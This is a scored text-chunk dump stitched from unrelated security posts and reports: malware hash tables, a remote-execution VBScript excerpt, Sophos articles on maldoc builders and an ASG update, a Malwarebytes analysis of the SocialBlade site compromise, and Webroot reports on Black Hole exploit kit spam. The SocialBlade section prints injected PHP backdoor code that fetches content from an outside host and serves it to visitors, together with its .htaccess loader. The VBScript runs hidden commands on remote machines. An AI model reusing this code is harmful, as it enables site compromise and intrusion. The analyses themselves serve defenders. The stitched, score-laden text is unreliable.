56ae7705ffcd56e74e5aecb0e43f17d510c2eaaddc7356f991c0db1daf32a641,0.009770743634966883
Hybrid 61850 and OPC effects module launcher,0.008058316036432256
ImapiService.exe,0.00789765120259589
7cc9ac6383437dd96161b93b017500a22a2c8d05f58778b9b9fce8ea73304546,0.009525280595819141
Launcher module,0.007933310325174414
ld.exe,0.008395430711037322
13a71a050d20aaad43ef78d771f22d636475b2ef8e4918731ff64d162287c480,0.00935420378440488
UPX-packed credential dumper using extensive Mimikatz source code,0.007095515639657379
mm.exe,0.008211692725837105
286c63d24fe9259bb6a758ce86e48c7f9094304ce4a32054641923a8cb4eab3c,0.010095636328675939
UPX-packed Mimikatz,0.008827788655880076
npadpr.exe,0.008318445980912581
376c0608820598f2f20666a82e1d801fce347233e2051010fbcf43c8278220dc,0.00967181435903175
Backdoor NOTEPAD variant,0.007296112036027869
opc.exe,0.008087865376113612
156bd34d713d0c8419a5da040b3c2dd48c4c6b00d8a47698e412db16b1ffac0f,0.01088374044261764
Stand-alone module,0.00772007836578259
pa.vbs,0.008130162366747906
fb5bbea0f1acfcf123979e4c615d54474c4f079276ee3828f5b8613bb3bbdf26,0.010283558117142655
System recon,0.007457455878551622
rm.vbs,0.008285846218164195
fb5bbea0f1acfcf123979e4c615d54474c4f079276ee3828f5b8613bb3bbdf26,0.010283558117142655
System recon,0.007457455878551622
swprv.exe,0.007898976893011889
dcb7d2fc46f61d5522e005ac66f3f0661e2d5284d5a3f8b3a0c8b4050d8397a7,0.010425739341807017
Variant of primary backdoor,0.007926779231842707
tiering.exe,0.008413494915703201
9a12493af09b0711edb0d6797fb195c64f3ca65437dd6274b171ebd22558172c,0.009989256055273232
Backdoor NOTEPAD variant,0.007296112036027869
tiersvc.exe,0.008738943286260126
ecaf150e087ddff0ec6463c92f7f6cca23cc4fd30fe34c10b3cb7c2a6d135c77,0.010789763702429789
Primary backdoor,0.007985471906492458
ws.exe,0.008018915999300491
6d707e647427f1ff4a7a9420188a8831f433ad8c5325dc8b8cc6fc5e7f1f6f47,0.009861724088240043
Primary backdoor,0.007985471906492458
Appendix B – Remote execution and survey script,0.006325119717532135
"As the script is lengthy, the below are selections from the file ‘remote.vbs’ to show the most relevant portions of the script:",0.009243120035949848
On Error Resume Next,0.009422705291062483
"Set WshShell = WScript.CreateObject(""WScript.Shell"")Set WshNetwork = WScript.CreateObject(""WScript.Network"")Set FSO = WScript.CreateObject(""Scripting.FileSystemObject"")",0.025950419207114606
Dim objSWbemLocatorDim objSWbemServices,0.008912360931713659
<BREAK>,0.008910712288718647
"Function RunRemoteProcess(Command)        Set objStartup = objSWbemServices.Get(""Win32_ProcessStartup"")        Set objConfig = objStartup.SpawnInstance_        objConfig.ShowWindow = 0   Set objProcess = objSWbemServices.Get(""Win32_Process"")        strCmd = ""cmd.exe /c "" & Command & "" >> "" & GetReportFile()   intReturn = objProcess.Create(strCmd, Null, objConfig, intProcessID)        If intReturn <> 0 Then   Wscript.Echo ""Process could not be created."" & _        vbNewLine & ""Command line: "" & strCmd & _        vbNewLine & ""Return value: "" & intReturn            RunRemoteProcess = 2            Exit Function        End If        Set WaitProcesses = objSWbemServices.ExecNotificationQuery(""Select * From __InstanceDeletionEvent Within 1 Where TargetInstance ISA 'Win32_Process'"")        Do Until i = 1            Set objLatestProcess = WaitProcesses.NextEvent            If objLatestProcess.TargetInstance.ProcessID = intProcessID Then                i = 1            End If        Loop        RunRemoteProcess = 0End Function",0.027617222034010735
<BREAK>,0.008910712288718647
"Function ConnectToServer(RemoteMachine, Username, Password)        Set objSWbemLocator = CreateObject(""WbemScripting.SWbemLocator"")   Set objSWbemServices = objSWbemLocator.ConnectServer(RemoteMachine, ""root\CIMV2"", Username, Password)   If Err.Number <> 0 Then        Wscript.StdOut.Write ""Error: "" & Err.Description            ConnectToServer = 1            Exit Function   End If        ConnectToServer = 0        Set colItems = objSWbemServices.ExecQuery(""Select * From Win32_OperatingSystem"")        For Each objItem in colItems            Header = vbNullString            Header = Header & objItem.Caption & objItem.CSDVersion & vbCrLF            Header = Header & ""CodeSet: "" & objItem.CodeSet & vbCrLF   Next   Wscript.StdOut.Write HeaderEnd Function
",0.021668267231918503
"New Papers and Articles
Here are a few papers and articles that have become available in the last week or two.",0.020158297013851745
9 Sep 2010 - 11:17AM,0.011678389046374749
Here are a few papers and articles that have become available in the last week or two.,0.019924266617339703
Here are a few papers and articles that have become available in the last week or two.,0.019924266617339703
Shortcuts to Insecurity: .LNK Exploits is an article for Security Week (http://www.securityweek.com) on the .LNK vulnerability classified as CVE-2010-2568 and exploited by Win32/Stuxnet.,0.010226988302378781
"Stuxnet is not the only malware that exploits this vulnerability, of course, and the September issue of Virus Bulletin includes several related analyses, including one of mine..However, they’re only available to Virus Bulletin subscribers at present. I’m also working with Aleks Matrosov and his colleagues on a detailed analysis which will be available in due course.",0.012852150833378317
"Talking of Virus Bulletin, PWN2KILL, EICAR and AV: Scientific and Pragmatic Research is an article I wrote for the June issue on the implications of the PWN2KILL challenge at iAWACS 2010 and the subsequent presentations at EICAR in May. The article is now available on our white papers page at http://www.eset.com/documentation/white-papers, where we also put up links to articles on external sites.",0.013339925758583449
"Last week, I attended the excellent Computer Forensics Education and Training (CFET) conference at Canterbury Christchurch University, in the UK. The two papers I presented there have now gone up on the white papers page.",0.020991136974086166
SODDImy and the Trojan Defence looks at at the implications in the age of the botnet of the “Some Other Dude Did It” and “it must have been a Trojan” defences against conviction for possession of illegal material.,0.0133663986176491
Antivirus Testing and AMTSO: Has Anything Changed? is a summary of how the Anti-Malware Testing Standards Organization has developed in the past few years and the way in which the AV and testing industries have responded to those developments.,0.017378123092412157
"David Harley CITP FBCS CISSP
ESET Senior Research Fellow
",0.011179100245160778
PRODUCTS & SERVICES,0.010734820384793453
Malicious doc “builders” abandon old exploits wholesale,0.0087026167901042
"A key piece of the malware ecosystem adopts new vulnerabilities, and scraps old exploits, in record time",0.00894512932599445
"Written by
Gabor Szappanos",0.010394306867931857
"September 11, 2018",0.009029442396739862
Malware SophosLabs Uncut CVE-2012-0158 CVE-2017-0199 CVE-2017-11882 CVE-2018-0802 CVE-2018-4878 document downloader dropper editor equation Excel maldoc maldocs malware Microsoft MSCOMCTL.OCX Office Powerpoint RTF weaponized word,0.011061682990958
"By Gabor Szappanos
A new study of weaponized office documents reveals that, in an uncharacteristically sudden and thorough shift of criminal priorities, a range of exploits formerly used (in some cases, for years) in those malicious documents have been scrapped.
In a matter of a few months around the beginning of 2018, the creators of tools used to mass produce maldocs made a clean sweep, and now only provide the ability to embed newer exploits. Criminals use these tools, known as builders, to manufacture malicious Word, Excel, Powerpoint, PDF, or RTF documents that make up key elements of targeted attacks, which they then spread primarily via email.
Over the past two years, the makers of these builder tools offered a relatively consistent menu of exploits from which criminals can choose, à la carte, the ones they wish to embed in their maldocs; As detection of older, more established exploits incrementally improve in security tools, the builder-makers typically remove those exploits gradually from their offerings. But we’ve never seen such a radical abandonment of existing exploits (and, in some cases, of the tools that implement them) in such a short period of time.",0.01320978758689384
"Largely as a result of the automated nature of these builders, researchers can identify signature characteristics that individual builder tools embed into maldocs as a way to establish the provenance of a given maldoc.
In the first quarter of this year, we found that just four exploit builder tools were responsible for the generation of more than three quarters of the in-the-wild maldocs we investigated. One builder, which calls itself Threadkit and sells for around $800 on Russian-language online criminal marketplaces, was used to create about a third of the malicious document files we analyzed.
Within a few months of the beginning of 2018, the most popular exploits, including the Ole2Link vulnerability (CVE-2017-0199), completely disappeared from maldoc attacks. This vulnerability, coincidentally, broke the four-year dominance of the CVE-2012-0158 vulnerability (a buffer overflow in the MSCOMCTL.OCX ActiveX control) last year, and merely 6 months later, joined the obsolete old bug in the dustbin of history.
Accordingly, some of the older builder tools, with names like Microsoft Word Intruder or AKBuilder, that implemented these older exploits also vaporized.
Threadkit, for example, supports a wide range of exploits; In maldocs we’ve seen that we’ve attributed to originate with this builder, the documents (primarily rich text files, or RTF) embed exploits tied to at least four separate vulnerabilities within the same file, as shown in the graphic below.
These exploit blocks trigger at least two stages of batch file installers, which in turn execute the final executable payload Threadkit is tasked with delivering. This redundancy may help with the infection success rate.
Likewise, contemporary maldoc attacks have been moving away from embedding malware directly into office documents. In the first quarter of 2018, the maldoc samples we investigated were all droppers, with the executable payload embedded within the document itself. But we’ve observed criminals switch gears to so-called “fileless” methods that invoke Windows-specific tools like PowerShell to download and execute the malicious payload, which makes the maldoc smaller in size, and more challenging to detect.
The exploits that these newer builders seem to prefer include a vulnerability in the Equation Editor feature in Microsoft Office (CVE-2017-11882) which, back in November, 2017 when Microsoft first published details about it, the company indicated had not been exploited in the wild.
Since then, we’ve observed this exploit embedded in at least 56% of the samples we looked at. The vulnerability does not require users to enable Macros in the Microsoft Office suite in order to execute code. Another vulnerability in Equation Editor, CVE-2018-0802, was used in 24% of maldocs we investigated, meaning one or another of these Equation Editor vulnerabilities were embedded in at least half the maldocs in our analysis.",0.017822992921449177
"For instance, the NebulaOne builder permits its users to configure and embed this exploit into a Word document.
Microsoft’s updates simply remove the Equation Editor from the system.
The even more recent Flash vulnerability (CVE-2018-4878) also made an impact, landing in fourth place on our chart, indicating that fresh vulnerabilities quickly make their way into the builder ecosystem.
We’ve also observed specific builder tools that appear to be tied to, or have exclusive distribution deals with, individual malware campaigns. For instance, Threadkit seemed to have an exclusive deal to deliver the Trickbot banking malware for a period of time, though it was also observed delivering the Lokibot RAT and a broader range of malware families. The EQN_kit1 builder delivered, in roughly equal proportions, the Fareit and Lokibot malware families, and to a lesser extent the XTRat and Remcos malware.",0.013445830096889266
"The good news, at least, is that patches have been available that prevent the majority of these attacks from succeeding for at least half a year, and exploit prevention technologies in Sophos and other companies’ products mean the exploits themselves are less effective with each passing day.
The bad news is that, obviously, the criminals seem to think that the mere availability of patches doesn’t mean that people will install them, and they may be right. All of this should be considered a call to arms for IT administrators or, frankly, anyone who uses a Microsoft Office suite on the Windows platform: Update your systems and the software that runs on them without delay, or suffer the consequences of one person’s mistaken click on the wrong office document.",0.01293077603531867
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"SocialBlade.com compromised, starts redirection chain to Nuclear Pack exploit kit
Update (07/29/2014): Following our notification, the developers in charge of SocialBlade.com have investigated and identified the source of the compromise. The site has been cleaned up of the malware and so far our systems have not detected anymore traces of suspicious activity. We will monitor the site for the next few days and update if required.
Update 2 (07/29/2014): SocialBlade devs were kind enough to provide us with technical server details of the attack. We are sharing those in here as well in an effort to help the many other affected site owners in quickly identifying and addressing this type of compromise. Jump to server side section
—
Last week, we wrote about the compromise on AskMen.com that was leading unsuspecting visitors to the Nuclear Pack exploit kit and infecting computers that were vulnerable.
In what appears to be a similar campaign, the YouTube stats tracker site SocialBlade.com is connected with malicious redirections that also lead to the Nuclear Pack EK.
“Social Blade is a statistics driven website where you can track your Youtube progress and compare to other big youtubers to see how you are doing.”",0.011246486813501932
"The drive-by download which was detected by our honeypots is successfully blocked by Malwarebytes Anti-Exploit.
According to site tracker SimilarWeb, SocialBlade.com has a global rank of 5,791 and had around 3.6 million visits last month.",0.010853885486190928
"Technical details
Traffic flow:
hxxp://socialblade.com/youtube/user/Goleyjoygame
hxxp://socialblade.com/js/jquery.js
hxxp://static.the-button.com/d2.php?ds=true&dr=1447532217
hxxp://static.pointweb.ca/pop2.php?acc=sbc%0E%97%B0%FA%DD%92%05%CAF%F8%8E%8A%D1rd+%DD%BE%89%DD%AE&nrk=6160647100
hxxp://e3dd7df0d05y.correctzoom.uni.me/
hxxp://50d88d1ad05y.correctzoom.uni.me/1406197380.swf
hxxp://50d88d1ad05y.correctzoom.uni.me/f/1406197380/7
hxxp://50d88d1ad05y.correctzoom.uni.me/1406197380.pdf
hxxp://50d88d1ad05y.correctzoom.uni.me/1406197380.htm
hxxp://50d88d1ad05y.correctzoom.uni.me/f/1406197380/5/x00520804090407000700080150050f0304045106565601;1;5
hxxp://50d88d1ad05y.correctzoom.uni.me/1406197380.jar
Website compromise:
Pinpointing exactly where the infection started was a little more complex than usual. Typically we’d see an iframe and we would be able to search for it by its string. This was not the case here, so we had to manually inspect each web session and external references.
The intruder was in a core JavaScript file: hxxp://socialblade.com/js/jquery.js",0.008368020342438443
"Very often, rogue code is appended to the end of existing plugins but isn’t always easy to spot or shouldn’t always be flagged as bad. What gave it away was looking for the original (unaltered) version of that jquery.js and compare both. It became obvious that additional code had been injected, probably by a backdoor residing on the web server itself.
Update: Server side details
Apache server logs:
–2014-07-28 18:27:18–  http://sux.pw/p/?type=raw&id=9dc0840c
Resolving sux.pw (sux.pw)…
Cross-site contamination:
The culprit: settings2.php
<?php
if (!isset($_SESSION)) session_start();
if (!isset($_SESSION[""pcid""]))
{
$imptt_agent = getenv('HTTP_USER_AGENT');
if(stristr($imptt_agent, 'Windows NT')&&(stristr($imptt_agent, 'MSIE')||stristr($imptt_agent, 'Trident')))
{
$imptt_ip = ip2long($_SERVER['REMOTE_ADDR']);
if($imptt_ip<0) $imptt_ip += 4294967296;
$imptt_fp = fsockopen(""static.the-button.com"", 80);
if ($imptt_fp)
{
fputs($imptt_fp,""GET /d2.php?dr="".rand(100000000,9999999999).""&di="".$imptt_ip.""&du="".urlencode($imptt_agent)."" HTTP/1.0\n\n"");
while(!feof($imptt_fp)) $imptt_pt=fgets($imptt_fp,4096);
print (base64_decode($imptt_pt));
fclose($imptt_fp);
$_SESSION['pcid'] = $imptt_ip;
}
}
}
?>
Infected .htaccess file:
The cause: an .htaccess (which had 777 perms) was loading the content of settings2.php (malicious code) into each file when the site was rendered.
php_value auto_append_file ""/var/www/blog/wp-admin/network/settings2.php""
Note: the actual directory path has been ‘anonymized’ as to not reveal SocialBlade’s infrastructure.
JavaScript code analysis
Now let’s get back to the JavaScript code server to visitors. The following variable (s) is made of unicode. This technique is often used to hide obvious strings from the human eye.
We can translate it to characters to see what it hides:",0.008814291042866906
This gives us the URL (static.the-button.com/d2.php?) that is used as an iframe. This looks like a compromised site (too bad for the fans of the TV series Lost – go there at your own risk!).,0.01058997249658944
"The rest of the JavaScript code writes the iframe and launches the redirection workflow. To see how it progresses we’re going to use Google Chrome’s JavaScript Console.
Because the code only fires if the user is running Internet Explorer or Firefox, we can comment out the condition so it always executes, even in Chrome.",0.009996571094186057
"The Network tab shows us what happens when that JavaScript is loaded. We can see the first request to d2.php, followed by pop2.php. It’s worth noting this redirection only happens once per IP address.",0.01303447061659313
"Redirector #1:
hxxp://static.the-button.com/d2.php?ds=true&dr=1447532217",0.008550878725549715
Source code:,0.007565550311713021
"This creates an iframe to a second redirector.
Redirector #2:
hxxp://static.pointweb.ca/pop2.php?acc=sbc%0E%97%B0%FA%DD%92%05%CAF%F8%8E%8A%D1rd+%DD%BE%89%DD%AE&nrk=6160647100",0.006343011543979538
"Now we have the final redirection to the exploit kit landing page (note the code obfuscation and the use of rot13 to mask the URL).
Nuclear Pack EK landing page:
hxxp://e3dd7df0d05y.correctzoom.uni.me/",0.01473405911778114
"Flash exploit (CVE-2014-0515?):
hxxp://50d88d1ad05y.correctzoom.uni.me/1406197380.swf
VT (5/53) link",0.008750253219796833
"PDF exploit (CVE-2010-0188 see this detailed blog post by Quequero):
hxxp://50d88d1ad05y.correctzoom.uni.me/1406197380.pdf
VT (4/52) link",0.009577485318364443
"Java exploit (CVE-2013-2465?):
hxxp://50d88d1ad05y.correctzoom.uni.me/1406197380.jar
VT (4/52) link",0.008833491464739773
"Internet Explorer exploit (CVE ?):
hxxp://50d88d1ad05y.correctzoom.uni.me/1406197380.htm
VT (0/53) link",0.008297796562235282
"Payload:
hxxp://50d88d1ad05y.correctzoom.uni.me/f/1406197380/7
VT (17/52) link
Malwarebytes Anti-Malware detects this as Trojan.Agent.ED.
This downloader talks back to: icepower.su/b/shoe/75412 and then attempts to download a file from smokejuse.su/mod_articles9874.564/jquery/. This most likely leads to ad-fraud related malware (clickjacking etc.).
We have notified the owners of SocialBlade.com so they can fix the issue ASAP and prevent unnecessary malware infections.
As always, please make sure your computer is up-to-date (especially the browser and its plugins) and that you have real-time Antivirus/Anti-Malware protection. To be even one step ahead of the bad guys, feel free to consider Anti-Exploit mitigation tools that proactively detect and block malicious code behavior.
@jeromesegura
",0.00973896482069836
"Cybercriminals have resumed spamvertising the Intuit Direct Deposit Service Informer themed malicious emails, which we intercepted and profiled earlier this month. While using an identical email template, the cybercriminals behind the campaign have introduced new client-side exploits serving domains, which ultimately lead to the latest version of the Black Hole Exploit Kit.
More details:",0.01343947505809251
Sample screenshot of the spamvertised email:,0.010990132234593664
"Sample spamvertised compromised URLs: hxxp://purebodyaromatherapy.com/wp-content/plugins/akismet/intuipayr.html; hxxp://mori-system.com/wp-content/plugins/akismet/intuipayr.html; hxxp://unlimitedleverage.com/wp-content/plugins/akismet/intuipayr.html; hxxp://oktoberfestkids.com/wp-content/plugins/akismet/intuipayr.html; hxxp://myfaircredit.com/wp-content/plugins/akismet/intuipayr.html; hxxp://car-rental-24.com/wp-content/plugins/akismet/intuipayr.html; hxxp://frdmd.com/wp-content/plugins/akismet/intuipayr.html; hxxp://m-sters.com/wp-content/plugins/intuipayr.html; hxxp://purebodyaromatherapy.com/wp-content/plugins/akismet/intuipayr.html; hxxp://forletteredwords.com/wp-content/plugins/akismet/intuipayr.html; hxxp://ivanaldavert.com/wp-content/plugins/akismet/intuipayr.html; hxxp://uznay-kak.com/wp-content/plugins/akismet/intuipayr.html; hxxp://choosehomefengshui.com/wp-content/plugins/akismet/intuipayr.html; hxxp://oktoberfestkids.com/wp-content/plugins/akismet/intuipayr.html; hxxp://leahsbeautyconcepts.com/wp-content/plugins/akismet/intuipayr.html
Client-side exploits serving URL: hxxp://cosmic-calls.net/detects/mixing-evened-quits-spot.php
Malicious payload dropping URL: hxxp://cosmic-calls.net/detects/mixing-evened-quits-spot.php?xpu=2w:31:33:1o:1g&ftzajz=3a&jlzjamgn=1k:2w:32:30:1n:1h:33:31:2v:2w&xlxsjzzi=1n:1d:1f:1d:1f:1d:1j:1k:1l
Sample client-side exploits served: CVE-2010-0188
Malicious domain name reconnaissance:
cosmic-calls.net – 108.171.243.172, AS40676 – Email: samyidea@aol.com, used to respond to 75.127.15.39
108.171.243.172
Name Server: NS1.CHELSEAFUN.NET
Name Server: NS2.CHELSEAFUN.NET
We’ve already seen these name servers in related and recently launched campaigns by the same cybercriminal/gang of cybercriminals – “‘Payroll Account Holded by Intuit’ themed emails lead to Black Hole Exploit Kit“; “‘Your Discover Card Services Blockaded’ themed emails serve client-side exploits and malware“.
Upon successful client-side exploitation, the campaign drops MD5: 896bae2880071c3a63d659a157d5c16f – detected by 33 out of 44 antivirus scanners as Worm:Win32/Cridex.E.
Upon execution, the sample phones back to hxxp://203.172.238.18:8080/DPNilBA/ue1elBAAAA/tlSHAAAAA/ (AS23974, Ministry of Education, Thailand). The following domain has also responded to this IP in the past: phnomrung.com (Name server: ns1.banbu.ac.th –  currently responding to 208.91.197.101).
Two MD5s are known to have phoned back to the same IP (203.172.238.18: )
MD5: 11AA0450551F89A17B4F2A66793D9408 – detected by 8 out of 44 antivirus scanners as Win32:Injector-AVZ [Trj]
MD5: f739f99f978290f5fc9a812f2a559bbb – detected by 23 out of 43 antivirus scanners as VirTool:Win32/CeeInject.EW
The main name servers used in the campaign, NS1.CHELSEAFUN.NET and NS2.CHELSEAFUN.NET, are also currently offering their services to the following malicious domains, participating in related campaigns:
performingandroidtoios.info (hxxp://performingandroidtoios.info/detects/ill_arise_pushed_addressing.php) – 199.59.166.108 – Email: cherilynn_yakibchuk192@cabacabana.com
headerandfooterprebuilt.pro (hxxp://headerandfooterprebuilt.pro/detects/quality_flyes-ticket_check.php) – 198.27.94.80 – Email: kee_mckibben0869@macfreak.com
fixedmib.net (hxxp://fixedmib.net/detects/fiscal_reduce.php) – 198.27.94.80 – Email: kessley_khouzam484@gh2000.com
We only managed to reproduce performingandroidtoios.info‘s malicious activity. Upon successful client-side exploitation, it drops MD5: fa762aba0abc5ed38a179fcaa6597033 – detected by 24 out of 44 antivirus scanners as PWS:Win32/Zbot.
Once executed, the sample creates the following files on the affected hosts:
MD5: 856A129FBAA3BBEF5B9F0FDDC6629C9D
MD5: 0B452576E3AEC9C0CBB1D68763F8AB44
MD5: 65EAFD7470C2122C519DBA22BF59B2D0
MD5: E56D76F26BD5976234B2D82984944334
The sample also initiates a DNS request to 0704271d3a758a87.com which is currently not responding. We also got additional MD5s that are known to have initiated similar DNS requests such as :
MD5: 9ed4ad1a26aa16aa4dd82ac9b785643e – detected by 27 out of 44 antivirus scanners as PWS:Win32/Zbot
MD5: 8b49e0df4e85f9a6fb6b14189a40b96b – detected by 28 out of 43 antivirus scanners as Trojan.Win32.Bublik.rmy
MD5: 76c6047e54d33e1ca5cfd8d589558d4b – detected by 4 out of 44 antivirus scanners as UDS:DangerousObject.Multi.Generic
MD5: 66561083053fb218e9e62f0a1ba545aa – detected by 28 out of 44 antivirus scanners as Trojan-Spy.Win32.Zbot.gjfd
MD5: 37e9d96104ba0c1b6ad6bdf700cf827c – detected by 27 out of 44 antivirus scanners as HEUR:Trojan.Win32.Generic
MD5: 0b22575888b4ee19452799025583b274 – detected by 29 out of 43 antivirus scanners as PWS:Win32/Zbot
MD5: 7e4de7064b069225a76654acff04e20d – detected by 18 out of 43 antivirus scanners as Trojan:Win32/Meredrop
MD5: 177b680098f710b81e6ef22bcae284b2 – detected by 34 out of 44 antivirus scanners as Trojan-Spy.Win32.Zbot.fdae
MD5: 76931198d990aee951f8e604794fe24a – detected by 27 out of 42 antivirus scanners as PWS:Win32/Zbot
MD5: c7c2e2c7613563298a6c68c0088e259f – detected by 9 out of 13 antivirus scanners as Trojan-Spy.Win32.Zbot
This isn’t the first time that cybercriminals have targeted Intuit’s customers. Go through related analysis of previously profiled malicious campaigns impersonating the company:",0.01459957167138548
"‘Payroll Account Holded by Intuit’ themed emails lead to Black Hole Exploit Kit
‘Intuit Payroll Confirmation inquiry’ themed emails lead to the Black Hole exploit kit
Intuit themed ‘QuickBooks Update: Urgent’ emails lead to Black Hole exploit kit
Cybercriminals impersonate Intuit Market, mass mail millions of exploits and malware serving emails
Spamvertised Intuit themed emails lead to Black Hole exploit kit",0.011816468340062558
"Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.010870420641694412
Sophos ASG Up2Date 8.312 Released,0.008420643926560611
"Written by
Eric Bégoc",0.010229904213713614
"July 08, 2014",0.008422657382218257
Network OpenSSL up2date,0.007928306771403326
"We are pleased to announce that a new Up2Date package is available for Sophos ASG.
This update includes the fix for the OpenSSL SSL/TLS vulnerability (CVE-2014-0224).
Please read on to see the full details of this release.",0.011891716988959411
"Sophos ASG 8.312
News",0.009129164032372183
Security Update,0.007849980180340443
Remarks,0.009780636038266843
System will be rebooted,0.007758715382572667
Bugfixes,0.009816324567177737
"31846 Upgrade to UTM9 not possible on ASG 220B (rev3)
31940 OpenSSL SSL/TLS MITM vulnerability (CVE-2014-0224)",0.011712129203695909
"Download:
While you do not need to manually download Up2Date packages (they will automatically download and prepare themselves for you to install), for manual application of Up2Dates or for ASG installations without Internet connections, you can retrieve them using the link below.
Download Link: ftp://ftp.astaro.de/ASG/v8/up2date/u2d-sys-8.312.tgz.gpg
MD5 Sum: 5cf6e90f9e1157779888225610863d77
Size:  ~4MB
Sophos Up2Date technology makes it easy to update your Astaro Security Gateway. There are two ways to apply an already-downloaded Up2Date package to the system:
1. Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on the “Watch Up2Date Progress in new window” and an extra browser window will show the progress of the Up2Date installation. (The System administrator will receive a notification email once the Up2Date process has finished.)
2. Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced:",0.009264045536499732
Sophos UTM Up2Date FTP Mirrors:,0.007242273332700666
Feedback,0.009067519666800083
"If you want to provide feedback or want to discuss any of the ASG or UTM features you should post it on our User Bulletin Board. Please indicate the version you are using (e.g. “[8.310] Configuring Skype Blocking”).
If you have any feedback on our help, manual, or any documentation (Online Help) please send it to nsg-documentations@sophos.com.",0.015376383087338241
"Eric Bégoc
Senior Product Manager",0.010102162674290538
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Facebook users, watch out!
A recently launched malicious spam campaign is impersonating Facebook, Inc. in an attempt to trick its one billion users into thinking that they’ve received a notification alerting them on activities they may have missed on Facebook. Upon clicking on any of the links found in the email, users are exposed to the client-side exploits served by the Black Hole Exploit Kit.
More details:",0.012541011474401786
Sample screenshot of the spamvertised email:,0.010990132234593664
"Sample spamvertised compromised URL: hxxp://www.covellogroup.com/new.htm?_RANDOM_CHARACTERS
Sample client-side exploits serving URL: hxxp://ceredinopl.ru:8080/forum/links/column.php
Malicious payload serving URL: hxxp://ceredinopl.ru:8080/forum/links/column.php?cfcjm=xbc229&fnhcuc=njx&svdp=2v:1k:1m:32:33:1k:1k:31:1j:1o&xdva=
Sample client-side exploits served: CVE-2010-0188
Malicious domain name reconnaissance:
ceredinopl.ru – 203.80.16.81 (AS24514); 208.87.243.131; 216.24.196.66 (AS40676); 202.180.221.186 (AS24496)
Name servers:
ns1.ceredinopl.ru – 203.172.140.202
ns10.ceredinopl.ru – 88.84.130.46
ns11.ceredinopl.ru – 89.216.41.8
ns12.ceredinopl.ru – 41.66.137.155
ns13.ceredinopl.ru – 79.142.32.36
ns14.ceredinopl.ru – 87.120.41.155
ns15.ceredinopl.ru – 72.55.156.167
ns16.ceredinopl.ru – 91.194.122.8
ns17.ceredinopl.ru – 202.3.245.13
ns18.ceredinopl.ru – 178.79.146.49
ns19.ceredinopl.ru – 69.64.89.82
ns2.ceredinopl.ru – 41.168.5.140
ns20.ceredinopl.ru – 70.38.31.71
ns21.ceredinopl.ru – 132.248.49.112
ns22.ceredinopl.ru – 74.117.59.55
ns23.ceredinopl.ru – 62.76.178.233
ns24.ceredinopl.ru – 62.76.188.138
ns25.ceredinopl.ru – 216.24.194.130
ns26.ceredinopl.ru – 79.98.27.9
ns27.ceredinopl.ru – 209.44.116.18
ns28.ceredinopl.ru – 173.224.220.180
ns29.ceredinopl.ru – 78.83.233.242
ns3.ceredinopl.ru – 132.248.49.112
ns30.ceredinopl.ru – 87.204.199.100
ns31.ceredinopl.ru – 199.71.212.78
ns32.ceredinopl.ru – 173.224.209.66
ns33.ceredinopl.ru – 62.76.188.246
ns34.ceredinopl.ru – 50.23.137.202
ns35.ceredinopl.ru – 95.154.43.193
ns36.ceredinopl.ru – 188.138.92.16
ns37.ceredinopl.ru – 64.150.187.72
ns38.ceredinopl.ru – 84.22.100.108
ns39.ceredinopl.ru – 184.106.189.124
ns4.ceredinopl.ru – 65.99.223.24
ns40.ceredinopl.ru – 116.12.49.68
ns41.ceredinopl.ru – 178.63.51.54
ns42.ceredinopl.ru – 120.89.91.57
ns43.ceredinopl.ru – 213.251.171.30
ns44.ceredinopl.ru – 85.125.81.51
ns5.ceredinopl.ru – 50.22.102.132
ns6.ceredinopl.ru – 41.168.5.140
ns7.ceredinopl.ru – 209.51.221.247
ns8.ceredinopl.ru – 203.80.16.81
ns9.ceredinopl.ru – 175.136.239.146",0.017388990172311658
"Upon successful client-side exploitation the campaign drops MD5: 9db13467c50ef248eaf6c796dffdd19c – detected by 3 out of 41 antivirus scanners as PWS-Zbot.gen.aqw.
Responding to the same IPs – 203.80.16.81 (AS24514); 208.87.243.131; 216.24.196.66 (AS40676); 202.180.221.186 (AS24496) – are also the following malicious domains:
investinindia.ru
hamasutra.ru
feronialopam.ru
monacofrm.ru
bamanaco.ru
ionalio.ru
investomanio.ru
veneziolo.ru
fanatiaono.ru
analunakis.ru",0.011485124966935878
"We’ve already seen and profiled some of these domains used in another malicious spam campaign, indicating that both campaigns have been launched by the same cybercriminal/gang of cybercriminals:
monacofrm.ru – seen in “‘Copies of Missing EPLI Policies’ themed emails lead to Black Hole Exploit Kit”
investomanio.ru – seen in “‘Copies of Missing EPLI Policies’ themed emails lead to Black Hole Exploit Kit”
veneziolo.ru – seen in “‘Copies of Missing EPLI Policies’ themed emails lead to Black Hole Exploit Kit”
Name servers part of the campaign’s infrastructure:
ns1.investinindia.ru – 62.76.178.233
ns2.investinindia.ru – 41.168.5.140
ns3.investinindia.ru – 132.248.49.112
ns4.investinindia.ru – 209.51.221.247
ns1.hamasutra.ru – 62.76.178.233
ns2.hamasutra.ru – 41.168.5.140
ns3.hamasutra.ru – 132.248.49.112
ns4.hamasutra.ru – 209.51.221.247
ns1.feronialopam.ru – 62.76.178.233
ns2.feronialopam.ru – 41.168.5.140
ns3.feronialopam.ru – 132.248.49.112
ns4.feronialopam.ru – 209.51.221.247
ns1.monacofrm.ru – 62.76.178.233
ns2.monacofrm.ru – 41.168.5.140
ns3.monacofrm.ru – 132.248.49.112
ns4.monacofrm.ru – 209.51.221.247
ns1.bamanaco.ru – 62.76.178.233
ns2.bamanaco.ru – 41.168.5.140
ns3.bamanaco.ru – 132.248.49.112
ns4.bamanaco.ru – 209.51.221.247
ns1.ionalio.ru – 62.76.178.233
ns2.ionalio.ru – 41.168.5.140
ns3.ionalio.ru – 132.248.49.112
ns4.ionalio.ru – 209.51.221.247
ns1.investomanio.ru – 62.76.178.233
ns2.investomanio.ru – 41.168.5.140
ns3.investomanio.ru – 132.248.49.112
ns4.investomanio.ru – 209.51.221.247
ns1.veneziolo.ru – 62.76.178.233
ns2.veneziolo.ru – 41.168.5.140
ns3.veneziolo.ru – 132.248.49.112
ns4.veneziolo.ru – 209.51.221.247
ns1.fanatiaono.ru – 62.76.178.233
ns2.fanatiaono.ru – 41.168.5.140
